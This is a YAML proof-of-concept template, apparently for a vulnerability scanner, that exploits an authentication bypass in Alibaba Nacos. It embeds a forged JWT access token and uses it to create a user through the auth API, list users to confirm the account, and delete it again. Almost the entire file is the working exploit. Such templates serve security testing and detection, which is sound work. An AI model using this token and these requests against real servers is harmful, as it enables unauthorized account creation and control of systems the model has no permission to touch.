name: poc-yaml-alibaba-nacos-jwt
set:
  r1: randomLowercase(16)
  r2: randomLowercase(16)
  token: string("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OX0.00LxfkpzYpdVeojTfqMhtpPvNidpNcDoLU90MnHzA8Q")

sets: 
  path: 
    - nacos/v1
    - v1

rules:
  - method: POST
    path: "/{{path}}/auth/users/?username={{r1}}&password={{r2}}&accessToken={{token}}"
    expression: |
      response.status == 200 && response.body.bcontains(bytes("create user ok!"))
  - method: GET
    path: "/{{path}}/auth/users/?pageNo=1&pageSize=999&accessToken={{token}}"

    expression: |
      response.status == 200 && response.body.bcontains(bytes(r1))
  - method: DELETE
    path: "/{{path}}/auth/users/?username={{r1}}&accessToken={{token}}"
    expression: |
      response.status == 200 && response.body.bcontains(bytes("delete user ok!"))
detail:
  author: kmahyyg(https://github.com/kmahyyg)
  links:
    - https://github.com/alibaba/nacos/issues/4593
